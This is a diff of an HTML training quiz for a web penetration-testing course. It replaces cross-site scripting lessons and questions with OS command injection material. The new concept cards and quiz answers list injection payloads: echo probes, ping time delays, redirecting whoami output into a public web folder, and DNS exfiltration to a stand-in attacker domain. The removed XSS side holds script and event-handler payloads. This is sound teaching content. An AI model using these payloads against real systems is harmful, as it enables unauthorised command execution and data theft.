@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>XSS Vulnerabilities — Quiz, Concept & Recon Kit</title>
+<title>OS Command Injection — Quiz, Concept & Recon Kit</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Baloo+2:wght@500;700;800&family=Manrope:wght@400;500;600;700&display=swap');
 
 :root{
-  --bg:#040208; --panel:#0f0a14; --line:#2a1f33;
-  --text:#d1c5d6; --dim:#75667a; --accent:#b026ff; --bad:#00ffff;
+  --bg:#000000; --panel:#0a0f0a; --line:#1a2a1a;
+  --text:#c5d6cc; --dim:#5a7560; --accent:#00ff41; --bad:#ff003c;
   --mono:'Fira Code','JetBrains Mono','Consolas',monospace;
 }
 *{box-sizing:border-box;}
@@ -18,67 +18,67 @@ body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min
 h1{font-size:22px;margin:6px 0 26px;color:#fff;}
 .bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
 .bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
-.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
-.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:0px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.8);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;border-bottom:1px dashed var(--line);padding-bottom:8px;}
 .qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
-.opt{display:block;width:100%;text-align:left;background:#0a0610;border:1px solid var(--line);
-  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
-  font-family:var(--mono);font-size:13.5px;transition:.15s;}
-.opt:hover{border-color:var(--accent);background:#150a1f;box-shadow:0 0 8px rgba(176,38,255,0.15);}
-.opt.correct{background:#1a0a24;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
-.opt.wrong{background:#001a1f;border-color:var(--bad);color:var(--bad);}
+.opt{display:block;width:100%;text-align:left;background:#040a04;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:0px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.1s; border-left:3px solid var(--line);}
+.opt:hover{border-left-color:var(--accent);border-color:var(--accent);background:#0f1a0f;}
+.opt.correct{background:#0a240a;border-left-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#240a0a;border-left-color:var(--bad);color:var(--bad);}
 .opt[disabled]{cursor:default;}
 .score{color:var(--dim);font-size:13px;}
 .center{text-align:center;}
 .big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);}
-.btn{background:var(--accent);color:#040208;border:none;padding:12px 20px;border-radius:7px;
-  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
-.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(176,38,255,0.2);}
-.btn:hover{background:#c44dff;}
-.btn.alt:hover{background:#150a1f;}
+.btn{background:var(--accent);color:#000;border:none;padding:12px 20px;border-radius:0px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;text-transform:uppercase;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(0,255,65,0.2);}
+.btn:hover{background:#33ff66;}
+.btn.alt:hover{background:#0f1a0f;}
 .emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;}
 @keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
-h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;text-transform:uppercase;letter-spacing:2px;}
 h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;}
 .chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
 .chk input{margin-top:3px;accent-color:var(--accent);}
 .chk.done label{color:var(--dim);text-decoration:line-through;}
-pre{background:#0a0610;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
-  overflow-x:auto;font-size:12.5px;color:#e0b3ff;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+pre{background:#040a04;border:1px solid var(--line);border-radius:0px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#b3ffb3;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
 .pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
 #quizView,#kitView,#conceptView{display:none;}
 
 /* Concept View Styles */
-.concept-card{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:7px;padding:18px;margin-bottom:16px;}
-.concept-card h3{margin-top:0;color:#fff;font-size:16px;text-shadow:0 0 5px rgba(176,38,255,0.3);}
+.concept-card{background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--accent);padding:18px;margin-bottom:16px;}
+.concept-card h3{margin-top:0;color:#fff;font-size:16px;text-shadow:0 0 5px rgba(0,255,65,0.3);}
 .concept-card p{font-size:14px;line-height:1.7;color:var(--text);}
 .concept-card b{color:var(--accent);}
 .concept-card ul{font-size:14px;line-height:1.7;color:var(--text);padding-left:20px;}
-.concept-card code{background:rgba(176,38,255,0.1);color:var(--accent);padding:2px 6px;border-radius:4px;font-size:12.5px;}
+.concept-card code{background:rgba(0,255,65,0.1);color:var(--accent);padding:2px 6px;font-size:12.5px;}
 .section-divider{color:var(--dim);font-size:12px;text-transform:uppercase;letter-spacing:2px;margin-top:30px;margin-bottom:15px;}
 
 .topbtns{display:flex;gap:10px;margin-bottom:18px;flex-wrap:wrap;}
-.explain{margin-top:12px;padding:12px 14px;background:#0a0610;border:1px solid var(--line);
-  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#040a04;border:1px solid var(--line);
+  font-size:13px;color:var(--dim);line-height:1.5;display:none;}
 .explain b{color:var(--accent);}
 #nextBtn{display:none;margin-top:16px;}
 
 /* Anti-Cheat Persistent Banner */
 .cheat-banner {
-  background: rgba(0, 255, 255, 0.1); border: 1px solid var(--bad); color: var(--bad);
-  padding: 10px 14px; border-radius: 7px; margin-bottom: 18px; font-size: 12.5px; text-align: center; display: none;
+  background: rgba(255, 0, 60, 0.1); border: 1px solid var(--bad); color: var(--bad);
+  padding: 10px 14px; margin-bottom: 18px; font-size: 12.5px; text-align: center; display: none; text-transform:uppercase;
 }
 
 /* Anti-Cheat Modal */
 .modal-overlay {
   position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-  background: rgba(4, 2, 8, 0.9); display: none; 
+  background: rgba(0, 0, 0, 0.9); display: none; 
   justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(5px);
 }
 .modal-overlay.show { display: flex; }
 .modal-content {
-  background: var(--panel); border: 1px solid var(--bad); padding: 30px; border-radius: 10px;
-  text-align: center; max-width: 400px; box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
+  background: var(--panel); border: 1px solid var(--bad); padding: 30px; max-width: 400px;
+  box-shadow: 0 0 30px rgba(255, 0, 60, 0.3); text-align: center;
 }
 .modal-icon { font-size: 40px; margin-bottom: 10px; }
 .modal-content h2 { color: var(--bad); margin: 0 0 10px; border: none; }
@@ -125,7 +125,7 @@ pre{background:#0a0610;border:1px solid var(--line);border-radius:7px;padding:12
 .vic-sparkle{ position: absolute; width: 10px; height: 10px; opacity: 0; animation: vicSparklePop 1.4s ease-out forwards; }
 .vic-sparkle svg{ width: 100%; height: 100%; }
 @keyframes vicSparklePop{ 0%{ opacity: 0; transform: scale(0) rotate(0deg); } 35%{ opacity: 1; transform: scale(1.3) rotate(45deg); } 100%{ opacity: 0; transform: scale(0.4) rotate(120deg); } }
-#vic-secret-toast{ position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(20px); background: rgba(15, 10, 20, 0.95); border: 1px solid var(--accent); color: var(--accent); padding: 10px 18px; border-radius: 8px; font-family: var(--mono); font-size: 12.5px; z-index: 30000; opacity: 0; pointer-events: none; transition: opacity .25s ease, transform .25s ease; }
+#vic-secret-toast{ position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(20px); background: rgba(10, 15, 10, 0.95); border: 1px solid var(--accent); color: var(--accent); padding: 10px 18px; border-radius: 0px; font-family: var(--mono); font-size: 12.5px; z-index: 30000; opacity: 0; pointer-events: none; transition: opacity .25s ease, transform .25s ease; text-transform: uppercase; }
 #vic-secret-toast.show{ opacity: 1; transform: translateX(-50%) translateY(0); }
 @media (prefers-reduced-motion: reduce){ #vic-overlay *{ animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; } }
 </style>
@@ -139,12 +139,12 @@ pre{background:#0a0610;border:1px solid var(--line);border-radius:7px;padding:12
     <h2>Proctoring Alert</h2>
     <p>Tab switching or window focus loss detected.</p>
     <p class="modal-desc">This action has been logged. A warning will remain on your screen. Please remain on the quiz tab to maintain exam integrity.</p>
-    <button class="btn" onclick="closeCheatWarning()" style="background:var(--bad); color:#000;">Acknowledge</button>
+    <button class="btn" onclick="closeCheatWarning()" style="background:var(--bad); color:#fff;">Acknowledge</button>
   </div>
 </div>
 
 <div class="wrap">
-  <div class="tag">WVAPT // Cross-Site Scripting (XSS)</div>
+  <div class="tag">WVAPT // OS Command Injection</div>
   <h1 id="pageTitle">Concept Check — 20 Questions</h1>
 
   <div id="quizView">
@@ -177,97 +177,100 @@ pre{background:#0a0610;border:1px solid var(--line);border-radius:7px;padding:12
 
   <div id="conceptView">
     <button class="btn alt" onclick="showQuiz()" style="margin-bottom: 20px;">← Back to Quiz</button>
-    <h2>Concept & Theory: XSS (Cross-Site Scripting)</h2>
+    <h2>Concept & Theory: OS Command Injection</h2>
     
     <div class="concept-card">
-      <h3>What is XSS?</h3>
-      <p>XSS is a vulnerability where an attacker injects malicious JavaScript into a web page. When another user opens the page, the script may run in their browser.</p>
-      <p><b>Simple example:</b> If a website displays user input without proper encoding: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, the browser may execute it as JavaScript instead of displaying it as text.</p>
+      <h3>What is OS Command Injection?</h3>
+      <p><b>The Core Problem:</b> A web application takes user input and glues it directly into a command that the operating system executes. The app doesn't check if the input is safe or if it contains special characters that could change what the command does.</p>
+      <p><b>Analogy:</b> Imagine a security guard who asks for your name and then shouts it into a megaphone without checking what you actually said. If you say "Hello", they shout "Hello". But if you say "Hello & Set off the fire alarm", they shout both commands — and the fire alarm goes off too!</p>
     </div>
 
     <div class="concept-card">
-      <h3>Impact</h3>
-      <p>XSS can potentially allow attackers to:</p>
+      <h3>Why Does This Vulnerability Exist?</h3>
+      <p><b>The OS is ALWAYS there</b> — Every web application runs on a server, and every server has an operating system. The OS is the foundation.</p>
+      <p><b>Developers take shortcuts</b> — Sometimes instead of writing code to do something themselves (like pinging a server or converting a file), developers just tell the OS to do it. They call a command directly.</p>
+      <p><b>The dangerous pattern:</b></p>
+      <pre>system("mail -s " + user_subject + " admin@site.com")</pre>
+      <p>This means whatever the user types as the subject gets pasted directly into a command that the OS runs.</p>
+    </div>
+
+    <div class="section-divider">The Two Main Variants</div>
+
+    <div class="concept-card">
+      <h3>Variant 1: Simple/Direct Command Injection (Visible Output)</h3>
+      <p><b>Definition:</b> The application executes your injected command AND shows you its output on the page.</p>
+      <p><b>How to detect it:</b></p>
       <ul>
-        <li>🍪 Steal session information</li>
-        <li>📋 Access sensitive page data</li>
-        <li>🎯 Perform actions as the victim</li>
-        <li>🔄 Redirect users</li>
-        <li>⌨️ Capture user input</li>
+        <li>Find a suspicious input field (Ping tools, File converters, URL with <code>?cmd=</code>, <code>?file=</code>, <code>?host=</code>).</li>
+        <li>Inject an echo test payload: <code>& echo aiwefwlguh &</code></li>
+        <li>If you see <code>aiwefwlguh</code> anywhere on the page, it's confirmed!</li>
+      </ul>
+      <p><b>Why a random string?</b> Because it would never normally appear on the page. If you used "test" and saw it, you couldn't be sure if it came from your injection or was already there.</p>
+      <p><b>Real Example Payload:</b> <code>https://site.com/check?ip=8.8.8.8 & whoami &</code> (If <code>whoami</code>'s output like <code>www-data</code> appears, it's vulnerable).</p>
+      <p><b>Common injection characters:</b></p>
+      <ul>
+        <li><code>&</code> : Run next command (always)</li>
+        <li><code>&&</code> : Run next command ONLY if first succeeds</li>
+        <li><code>|</code> : Pipe output to next command</li>
+        <li><code>;</code> : Run next command (Linux/Unix only)</li>
+        <li><code>||</code> : Run next command ONLY if first fails</li>
       </ul>
     </div>
 
-    <div class="section-divider">6 Types of XSS</div>
-
     <div class="concept-card">
-      <h3>1. Reflected XSS</h3>
-      <p>The malicious input is sent to the server and immediately reflected in the response.</p>
-      <p><b>Flow:</b> Attacker → Malicious URL → Server → Victim's Browser → XSS</p>
-      <p><b>Key point:</b> Payload is not stored on the server.</p>
-      <p><b>Example:</b> <code>/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-    </div>
-
-    <div class="concept-card">
-      <h3>2. Stored XSS</h3>
-      <p>The malicious input is stored on the server, usually in a database.</p>
-      <p><b>Flow:</b> Attacker → Malicious Comment → Database → Victim → XSS</p>
-      <p><b>Key point:</b> Payload is stored and can affect multiple users.</p>
-    </div>
-
-    <div class="concept-card">
-      <h3>3. DOM-Based XSS</h3>
-      <p>The vulnerability exists in client-side JavaScript. The server doesn't need to reflect the payload.</p>
-      <p><b>Flow:</b> URL/Input → JavaScript → Unsafe DOM Function → XSS</p>
-      <p><b>Common sources:</b> <code>location.hash</code>, <code>location.search</code>, <code>document.URL</code></p>
-      <p><b>Common dangerous sinks:</b> <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code></p>
-      <p><b>Key point:</b> The attack happens mainly in the browser.</p>
-    </div>
-
-    <div class="concept-card">
-      <h3>4. Self-XSS</h3>
-      <p>The victim is tricked into manually running malicious JavaScript, usually in the browser console.</p>
-      <p><b>Example:</b> "Paste this code into your console to get free coins."</p>
-      <p><b>Key point:</b> The victim executes the code themselves.</p>
-    </div>
-
-    <div class="concept-card">
-      <h3>5. Blind XSS</h3>
-      <p>A type of stored XSS where the attacker cannot see where the payload executes.</p>
-      <p><b>Example:</b> Attacker → Feedback Form → Admin Dashboard → XSS</p>
-      <p>The attacker may use a controlled callback server to detect execution.</p>
-      <p><b>Key point:</b> You don't directly see the page where your payload runs.</p>
-    </div>
-
-    <div class="concept-card">
-      <h3>6. XSS in Different Contexts</h3>
-      <p>XSS can occur in different places:</p>
+      <h3>Variant 2: Blind Command Injection</h3>
+      <p><b>Definition:</b> The application runs your injected command, but you CANNOT see its output on the page. You need other tricks to confirm it worked or to steal data.</p>
+      <p><b>Why this happens:</b> The app executes the command in the background and doesn't display its output. Common examples: email forms, feedback submissions, logging functions.</p>
+      
+      <p><b>Blind Technique 1: Time Delays</b></p>
+      <p>Make the OS pause for a set amount of time. If the response takes longer than normal, your command ran.</p>
       <ul>
-        <li><b>HTML Context:</b> <code>&lt;div&gt;USER_INPUT&lt;/div&gt;</code></li>
-        <li><b>Attribute Context:</b> <code>&lt;input value="USER_INPUT"&gt;</code></li>
-        <li><b>JavaScript Context:</b> <code>var name = 'USER_INPUT';</code></li>
-        <li><b>DOM Context:</b> <code>element.innerHTML = userInput;</code></li>
+        <li>Linux: <code>& ping -c 10 127.0.0.1 &</code> (ping localhost 10 times, ~1 sec each)</li>
+        <li>Windows: <code>& ping -n 10 127.0.0.1 &</code> (Windows uses <code>-n</code> instead of <code>-c</code>)</li>
       </ul>
-      <p><b>Key point:</b> The correct defense depends on where the input is inserted.</p>
+      
+      <p><b>Blind Technique 2: Output Redirection to a File</b></p>
+      <p>Tell your injected command to save its output to a file inside a folder that the web server publicly serves.</p>
+      <pre>& whoami > /var/www/images/whoami.txt &</pre>
+      <p>After sending, visit <code>https://site.com/images/whoami.txt</code>. If you see <code>www-data</code>, you've extracted data! (You must know a writable public folder path).</p>
+      
+      <p><b>Blind Technique 3: Out-of-Band (OAST) Detection</b></p>
+      <p>Make the server perform a DNS lookup to a domain you control. You watch your domain's logs to see if the lookup happened.</p>
+      <ul>
+        <li>Detecting: <code>& nslookup kgji2ohoyw.attacker-domain.com &</code></li>
+        <li>Exfiltrating: <code>& nslookup `whoami`.attacker-domain.com &</code> (The output of <code>whoami</code> gets inserted into the domain name!)</li>
+      </ul>
     </div>
 
-    <div class="section-divider">Advanced Vectors & Prevention</div>
+    <div class="section-divider">Practical Guide</div>
 
     <div class="concept-card">
-      <h3>XSS via HTTP Headers</h3>
-      <p>Headers such as <code>User-Agent</code> and <code>Referer</code> can become XSS injection points if an application stores or displays them without proper encoding.</p>
-      <p><b>Flow:</b> Attacker → Malicious Header → Server stores it → Admin views it → XSS</p>
-      <p>This can result in Blind XSS.</p>
+      <h3>Testing Checklist & OS Detection</h3>
+      <p><b>Step 1: Try visible output:</b> <code>& echo aiwefwlguh &</code></p>
+      <p><b>Step 2: Try time delay:</b> <code>& ping -c 10 127.0.0.1 &</code></p>
+      <p><b>Step 3: Try file redirect:</b> <code>& whoami > /var/www/images/test.txt &</code></p>
+      <p><b>Step 4: Use OAST:</b> <code>& nslookup `whoami`.YOUR-DOMAIN.com &</code></p>
+      <p><b>Identifying the Operating System:</b></p>
+      <ul>
+        <li><code>uname -a</code> : Works on Linux, Fails on Windows</li>
+        <li><code>ver</code> : Fails on Linux, Works on Windows</li>
+        <li><code>whoami</code> : Works on both</li>
+        <li><code>id</code> : Works on Linux, Fails on Windows</li>
+      </ul>
+      <p><b>Clues:</b> <code>.php</code> often = Linux, <code>.aspx</code> often = Windows. <code>Server: Apache</code> = Linux, <code>Server: IIS</code> = Windows.</p>
     </div>
 
     <div class="concept-card">
-      <h3>XSS Prevention</h3>
-      <ol>
-        <li><b>Input Validation:</b> Accept only the data the application expects.</li>
-        <li><b>Output Encoding:</b> Encode data according to its context (HTML, Attribute, JavaScript, URL).</li>
-        <li><b>Use Safe DOM Functions:</b> Prefer <code>element.textContent = userInput;</code> over <code>element.innerHTML</code> or <code>eval()</code>.</li>
-        <li><b>Use CSP:</b> Content Security Policy can restrict which scripts are allowed to execute.</li>
-        <li><b>Use Framework Protections:</b> React, Vue, Angular provide automatic escaping, but unsafe features can still introduce XSS.</li>
-      </ol>
+      <h3>URL Encoding Rule</h3>
+      <p><b>IMPORTANT:</b> When injecting into form-encoded requests (like <code>application/x-www-form-urlencoded</code>), special characters must be encoded:</p>
+      <ul>
+        <li>Space -> <code>%20</code></li>
+        <li><code>&</code> -> <code>%26</code></li>
+        <li><code>></code> -> <code>%3e</code></li>
+        <li><code><</code> -> <code>%3c</code></li>
+        <li><code>#</code> -> <code>%23</code></li>
+      </ul>
+      <p>Without encoding: The server parses <code>&</code> as "new form field" instead of part of your payload value.</p>
     </div>
   </div>
 
@@ -327,106 +330,109 @@ pre{background:#0a0610;border:1px solid var(--line);border-radius:7px;padding:12
 <div id="vic-secret-toast"></div>
 
 <script>
-// Clear local storage on load to prevent any old cached 21-question state
+// Clear local storage on load to prevent any old cached state
 localStorage.clear();
 
-// Note: HTML tags in strings are safely escaped (e.g., "<\/script>") to prevent browser parser errors.
 // EXACTLY 20 QUESTIONS. Numbered 1 to 20 for absolute verification.
 const Q=[
 // 1
-["What fundamentally defines a Cross-Site Scripting (XSS) vulnerability?",["Injecting malicious JavaScript into a web page executed in a browser","Stealing session cookies by exploiting a backend database flaw safely","Crashing the server by sending oversized HTTP payload requests locally","Bypassing authentication by manipulating the HTTP Host header value"],0,
-"XSS is a vulnerability where an attacker injects malicious JavaScript into a web page that runs in a victim's browser."],
+["What is the core problem of OS Command Injection?",["The app glues user input directly into an OS command safely","The app encrypts user input using AES-256 algorithms locally","The app automatically blocks known malicious IP addresses now","The app strictly enforces parameterized query logic locally"],0,
+"A web application takes user input and glues it directly into a command that the OS executes without checking it."],
 // 2
-["Which payload tests basic HTML context execution safely?",["<script>alert(1)<\/script>","<img src=x onerror=alert(1)>","javascript:alert(1)","<svg onload=alert(1)>"],0,
-"The classic <script>alert(1)<\/script> payload tests if the browser executes injected JavaScript in HTML context."],
+["Why does the OS Command Injection vulnerability exist?",["Developers take shortcuts telling the OS to run commands","Developers use strict parameterized queries for database here","Developers encrypt all network traffic using TLS 1.3 safely","Developers implement strict input validation allowlists here"],0,
+"Instead of writing code to do something themselves, developers just tell the OS to do it directly via a command."],
 // 3
-["What is the primary characteristic of Reflected XSS?",["Malicious input is sent to server and immediately reflected in response","Malicious input is stored permanently in the backend database locally","The vulnerability exists entirely within client-side JavaScript safely here","The victim is tricked into pasting malicious code into their console"],0,
-"In Reflected XSS, the malicious input is sent to the server and immediately reflected in the HTTP response."],
+["What defines Simple/Direct Command Injection (Visible Output)?",["The app executes the injected command and shows its output","The app runs the injected command but never shows its output","The app blocks the injected command and returns an error","The app encrypts the injected command before execution safely"],0,
+"The application executes your injected command AND shows you its output on the page."],
 // 4
-["How does Stored XSS differ from Reflected XSS?",["Stored XSS payload is saved in the database affecting multiple users","Stored XSS requires the victim to click a malicious link to execute","Stored XSS happens entirely in the browser without server interaction","Stored XSS tricks the victim into running code in the browser console"],0,
-"Stored XSS payload is stored on the server (usually in a database) and can affect multiple users who view the page."],
+["Why use a random string like 'aiwefwlguh' in an echo test?",["Because it would never normally appear on the web page","Because it bypasses the web application firewall entirely","Because it triggers a buffer overflow in the web server safely","Because it encrypts the payload to hide it from logs securely"],0,
+"If you used 'test' and saw it, you couldn't be sure if it came from your injection or was already there."],
 // 5
-["Where does the vulnerability exist in DOM-Based XSS?",["Entirely within client-side JavaScript processing user input safely","Within the backend database storing malicious JavaScript payloads","Within the HTTP headers reflected back by the reverse proxy now","Within the TLS encryption layer intercepting network traffic safely"],0,
-"In DOM-Based XSS, the vulnerability exists in client-side JavaScript. The server doesn't need to reflect the payload."],
+["What is the meaning of the `&&` injection character?",["Run next command ONLY if first succeeds securely safely","Run next command always regardless of first locally now","Pipe the output of the first command to the second entirely","Run next command ONLY if first fails entirely and securely"],0,
+"`&&` means 'Run next command ONLY if first succeeds'."],
 // 6
-["Which of the following is a common DOM XSS source?",["location.hash","document.cookie","eval()","innerHTML"],0,
-"Common DOM XSS sources include location.hash, location.search, and document.URL."],
+["What is the meaning of the `|` injection character?",["Pipe output to next command securely and safely entirely here","Run next command always regardless of first locally and safely","Run next command ONLY if first fails entirely and securely now","Run next command ONLY if first succeeds securely and safely now"],0,
+"`|` means 'Pipe output to next command'."],
 // 7
-["Which of the following is a dangerous DOM XSS sink?",["element.innerHTML","element.textContent","window.location","document.referrer"],0,
-"Common dangerous sinks include innerHTML, document.write(), and eval()."],
+["What defines Blind Command Injection?",["The app runs the command but you cannot see its output","The app executes the command and shows its output safely now","The app blocks the command and returns a 403 error entirely","The app encrypts the command before executing it locally now"],0,
+"The application runs your injected command, but you CANNOT see its output on the page."],
 // 8
-["What defines Self-XSS?",["The victim is tricked into manually running malicious JS in console","The attacker stores malicious JS in the database to run on admin page","The server reflects the malicious JS immediately in the HTTP response","The malicious JS executes entirely within the client-side browser DOM"],0,
-"In Self-XSS, the victim is tricked into manually running malicious JavaScript, usually in the browser console."],
+["How does the Time Delay technique work in blind injection?",["Make the OS pause for a set amount of time and measure it","Make the OS write output to a publicly accessible file safely","Make the OS perform a DNS lookup to a controlled domain now","Make the OS echo a random string back to the web page safely"],0,
+"Make the OS pause for a set amount of time. If the response takes longer, your command ran."],
 // 9
-["What is the defining characteristic of Blind XSS?",["The attacker cannot see where the payload executes on the server","The attacker can directly see the payload execute in the HTTP response","The victim must click a malicious link to trigger the payload safely","The payload executes instantly without interacting with the server"],0,
-"Blind XSS is a type of stored XSS where the attacker cannot see where the payload executes (e.g., an admin panel)."],
+["Which payload induces a 10-second delay on a Linux system?",["& ping -c 10 127.0.0.1 &","& ping -n 10 127.0.0.1 &","& nslookup attacker.com &","& whoami > /var/www/images/test.txt &"],0,
+"Linux uses `ping -c 10 127.0.0.1` (ping localhost 10 times, ~1 sec each)."],
 // 10
-["How is Blind XSS typically detected by the attacker?",["Using a controlled callback server to detect execution safely","By monitoring the server response time for intentional delays now","By viewing the rendered HTML source code in the browser directly","By brute-forcing the administrative login form endpoint locally"],0,
-"The attacker may use a controlled callback server (like Burp Collaborator) to detect execution."],
+["Which payload induces a 10-second delay on a Windows system?",["& ping -n 10 127.0.0.1 &","& ping -c 10 127.0.0.1 &","& uname -a &","& echo aiwefwlguh &"],0,
+"Windows uses `ping -n 10 127.0.0.1 &` (Windows uses -n instead of -c)."],
 // 11
-["If input is placed inside <input value=\"USER_INPUT\">, what context is it?",["Attribute Context securely and entirely locally now safely here","HTML Context safely and entirely locally now securely and entirely","JavaScript Context safely and entirely locally now securely and entirely","DOM Context safely and entirely locally now securely and entirely here"],0,
-"If input is placed inside an HTML tag attribute, it is in the Attribute Context."],
+["What is the purpose of the Output Redirection technique?",["Save output to a file inside a folder the web server serves","Make the server pause for 10 seconds to confirm injection now","Make the server perform a DNS lookup to an external domain","Display the output of the command directly on the web page"],0,
+"Tell your injected command to save its output to a file inside a folder that the web server publicly serves."],
 // 12
-["If input is placed inside var name = 'USER_INPUT';, what context is it?",["JavaScript Context safely and entirely locally now securely here","HTML Context safely and entirely locally now securely and entirely","Attribute Context safely and entirely locally now securely and entirely","DOM Context safely and entirely locally now securely and entirely here"],0,
-"If input is placed inside a JavaScript variable assignment, it is in the JavaScript Context."],
+["What does the `>` character do in the payload `& whoami > /var/www/whoami.txt &`?",["Redirects the output of the command to a specified file","Pipes the output of the command to another command safely","Runs the command only if the previous command succeeds","Appends the output of the command to the system log now"],0,
+"`>` means 'redirect output to a file'."],
 // 13
-["Which HTTP header can become an XSS injection point if displayed unencoded?",["User-Agent","Content-Length","Accept-Encoding","Connection"],0,
-"Headers such as User-Agent and Referer can become XSS injection points if stored or displayed without encoding."],
+["What is required for the Output Redirection technique to work?",["You must know a writable public folder path on the server","You must have administrative privileges on the database safely","You must disable the web application firewall entirely now","You must intercept the network traffic using a proxy tool here"],0,
+"You must know a writable public folder path (e.g., /var/www/images/)."],
 // 14
-["Why is XSS via HTTP headers often considered Blind XSS?",["The attacker doesn't directly see the admin panel where it executes","The payload executes instantly in the attacker's own browser safely","The server automatically blocks the payload before execution now","The payload is restricted by the browser's same-origin policy here"],0,
-"The attacker injects the header, but doesn't directly see the admin page where the header is viewed, making it blind."],
+["How does Out-of-Band (OAST) detection work?",["Make the server perform a DNS lookup to a domain you control","Make the server pause for 10 seconds and measure response","Make the server echo a random string back to the web page now","Make the server write output to a publicly accessible file safely"],0,
+"Make the server perform a DNS lookup to a domain you control and watch your domain's logs."],
 // 15
-["What is the primary goal of Output Encoding in XSS prevention?",["Encode data according to its specific context safely and securely","Encrypt all user input using AES-256 algorithms before transmission","Block all incoming requests containing special characters entirely","Strip all HTML tags from user input before storing in the database"],0,
-"Output Encoding means encoding data according to its context (HTML, Attribute, JavaScript, URL)."],
+["Why is OAST considered the most powerful blind technique?",["It works when no output is shown and file writes fail safely","It works only when the application displays output directly","It requires administrative privileges on the target server now","It bypasses network firewalls by encrypting the payload safely"],0,
+"It works even when no output is shown and even when you can't write files."],
 // 16
-["Which DOM function is considered SAFE against XSS?",["element.textContent = userInput;","element.innerHTML = userInput;","document.write(userInput);","eval(userInput);"],0,
-"Prefer element.textContent = userInput; over unsafe functions like innerHTML or eval()."],
+["How can an attacker exfiltrate data using OAST?",["By putting the data IN the domain name itself for DNS lookup","By writing the data to a publicly accessible text file safely","By measuring the response time of the HTTP request locally","By echoing the data directly onto the vulnerable web page now"],0,
+"By using `nslookup \`whoami\`.attacker-domain.com`, the output becomes part of the domain name."],
 // 17
-["What does Content Security Policy (CSP) do to prevent XSS?",["Restricts which scripts are allowed to execute on the page safely","Encrypts all session cookies transmitted over the network securely","Automatically sanitizes all user input before database insertion now","Blocks all cross-origin resource sharing requests entirely locally"],0,
-"CSP can restrict which scripts are allowed to execute, mitigating the impact of XSS."],
+["Which command works on Linux but fails on Windows?",["uname -a","ver","dir","ping -n 10 127.0.0.1"],0,
+"`uname -a` works on Linux but fails on Windows."],
 // 18
-["Do modern frameworks like React or Angular completely eliminate XSS?",["No, unsafe features can still introduce XSS vulnerabilities safely","Yes, they completely eliminate all XSS vulnerabilities by default","Yes, as long as you use the latest version of the framework here","No, they actually increase the risk of XSS vulnerabilities globally"],0,
-"Frameworks provide automatic escaping, but unsafe features (like dangerouslySetInnerHTML) can still introduce XSS."],
+["Which command works on Windows but fails on Linux?",["ver","uname -a","whoami","id"],0,
+"`ver` works on Windows but fails on Linux."],
 // 19
-["What is the potential impact of a successful XSS attack?",["Stealing session information and performing actions as the victim","Crashing the database server completely using memory exhaustion","Bypassing the network firewall to access internal systems locally","Encrypting the server's hard drive and demanding a ransom payment"],0,
-"XSS can allow attackers to steal session cookies, access sensitive data, and perform actions as the victim."],
+["When injecting into form-encoded requests, what must you do?",["Special characters must be encoded using URL encoding safely","Special characters must be encrypted using AES-256 locally","Special characters must be completely removed from payload","Special characters must be appended to the end of the URL now"],0,
+"Special characters must be encoded (e.g., `&` becomes `%26`)."],
 // 20
-["Which of the following is a common payload for Attribute Context XSS?",["\" onmouseover=\"alert(1)","<script>alert(1)<\/script>","'; alert(1); //","javascript:alert(1)"],0,
-"In Attribute Context, you break out of the attribute using a quote and add an event handler like onmouseover."]
